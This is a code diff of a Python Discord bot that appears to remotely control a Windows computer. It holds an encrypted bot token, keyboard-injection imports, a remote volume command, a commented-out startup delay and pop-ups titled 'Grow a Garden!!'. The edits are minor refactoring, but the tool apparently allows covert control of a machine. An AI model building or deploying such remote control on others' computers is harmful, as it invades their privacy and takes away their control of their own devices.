@@ -32,12 +32,13 @@ from functools import wraps
 import keyboard
 from pynput.keyboard import Key, Controller
 import tempfile
+import datetime
 
 TESTING = False
-VERSION = "v6.7"
-if not TESTING:
-    # pass
-    time.sleep(30)
+VERSION = "v6.9"
+# if not TESTING:
+#     # pass
+#     time.sleep(30)
 
 def retriveToken() -> str:
     global TESTING
@@ -51,17 +52,17 @@ def retriveToken() -> str:
     encrypted_token = testingToken if TESTING else mainToken
     return cipher.decrypt(encrypted_token.encode()).decode()
 
-async def wait_for_discord(timeout=5, retry_delay=5):
-    while True:
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get("https://discord.com", timeout=timeout) as resp:
-                    if resp.status == 200:
-                        return
-        except Exception as e:
-            await asyncio.sleep(retry_delay)
 
 async def main():
+    async def wait_for_discord(timeout=5, retry_delay=5):
+        while True:
+            try:
+                async with aiohttp.ClientSession() as session:
+                    async with session.get("https://discord.com", timeout=timeout) as resp:
+                        if resp.status == 200:
+                            return
+            except Exception as e:
+                await asyncio.sleep(retry_delay)
 
     await wait_for_discord()
 
@@ -582,14 +583,13 @@ async def main():
 
         # Set volume: 0.0 (min) to 1.0 (max)
         volume.SetMasterVolumeLevelScalar(number, None)
-        await ctx.respond(f"Volume set to {int(number * 100)}% (This may not work)")
+        await ctx.respond(f"Volume set to {int(number * 100)}%")
 
 
     def show_prompt(text):
         root = tk.Tk()
         root.withdraw()
 
-        # Show a message box with an OK button
         messagebox.showinfo("( ͡◉◞ ͜ʖ◟ ͡◉) Grow a Garden!!", " "*35 + f"\n{text}\n" + " "*35)
     
 
